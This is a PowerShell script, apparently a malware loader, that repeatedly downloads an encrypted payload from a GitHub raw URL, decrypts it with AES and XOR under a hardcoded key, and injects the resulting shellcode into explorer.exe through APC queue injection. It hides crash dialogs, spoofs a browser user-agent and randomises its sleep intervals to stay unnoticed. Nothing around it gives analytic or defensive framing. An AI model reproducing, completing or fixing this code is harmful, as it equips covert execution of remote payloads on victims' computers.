while ($true) {
    try {
        # === SUPPRESS CRASH DIALOGS (prevents "explorer.exe has stopped" popups) ===
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ApcHelper {
    [DllImport("kernel32.dll")] public static extern uint SetErrorMode(uint uMode);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, int size, out IntPtr written);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
    [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
"@ -ErrorAction SilentlyContinue

        [ApcHelper]::SetErrorMode(0x8001) | Out-Null

        # === GET EXPLORER ===
        $explorer = Get-Process explorer -ErrorAction SilentlyContinue
        if (-not $explorer) {
            Start-Sleep -Seconds 10
            continue
        }

        # === DOWNLOAD AND DECRYPT (unchanged from original) ===
        $url = "https://github.com/jasikawedss-commits/test2/raw/refs/heads/main/121.bin"
        $xorKey = 0x5A
        $aesPassword = "S3cur3Passphras3!"
        $enc = $null
        for ($attempt = 1; $attempt -le 3; $attempt++) {
            try {
                $enc = (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 30 -Headers @{"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}).Content
                break
            } catch {
                Start-Sleep -Seconds (5 * $attempt)
            }
        }
        if (-not $enc) {
            Start-Sleep -Seconds 60
            continue
        }

        $key = [Text.Encoding]::UTF8.GetBytes($aesPassword.PadRight(32, "X").Substring(0,32))
        $iv = $enc[0..15]
        $cipher = $enc[16..($enc.Length - 1)]
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $decryptor = $aes.CreateDecryptor()
        $xored = $decryptor.TransformFinalBlock($cipher, 0, $cipher.Length)
        [byte[]]$shellcode = foreach ($b in $xored) { $b -bxor $xorKey }

        if (-not $shellcode -or $shellcode.Length -lt 200) {
            Start-Sleep -Seconds 60
            continue
        }

        # === INJECT INTO EXPLORER (APC ONLY) ===
        $hProc = [ApcHelper]::OpenProcess(0x1F0FFF, $false, $explorer.Id)
        if ($hProc -eq [IntPtr]::Zero) { throw "Failed to open explorer.exe" }

        $addr = [ApcHelper]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$shellcode.Length, 0x3000, 0x40)
        if ($addr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }

        $written = [IntPtr]::Zero
        [ApcHelper]::WriteProcessMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]$written) | Out-Null

        # === SAFE THREAD SELECTION (THE FIX) ===
        # Only select threads that are in an alertable wait state (WaitReason = UserRequest)
        # This prevents freezing because APC can actually execute on these threads.
        $threads = $explorer.Threads | Where-Object {
            $_.ThreadState -eq 'Wait' -and
            $_.WaitReason -eq 'UserRequest'
        } | Select-Object -First 3

        # If no alertable threads exist, we skip injection to avoid crashing explorer.
        if (-not $threads) {
            Write-Host "No alertable threads found - skipping injection this cycle" -ForegroundColor Yellow
            [ApcHelper]::CloseHandle($hProc)
            Start-Sleep -Seconds 60
            continue
        }

        $successCount = 0
        foreach ($t in $threads) {
            $hThread = [ApcHelper]::OpenThread(0x0010, $false, $t.Id)
            if ($hThread -ne [IntPtr]::Zero) {
                $result = [ApcHelper]::QueueUserAPC($addr, $hThread, [IntPtr]::Zero)
                if ($result -ne 0) { $successCount++ }
                [ApcHelper]::CloseHandle($hThread)
            }
        }

        [ApcHelper]::CloseHandle($hProc)

        # Optional: log success
        if ($successCount -gt 0) {
            Write-Host "APC injection successful on $successCount thread(s)" -ForegroundColor Green
        }

    } catch {
        # Silent fail 鈥?no crash dialogs, just log
        Write-Host "Error: $_" -ForegroundColor Red
    }

    $sleepTime = 240 + (Get-Random -Minimum -60 -Maximum 120)
    Start-Sleep -Seconds $sleepTime
}
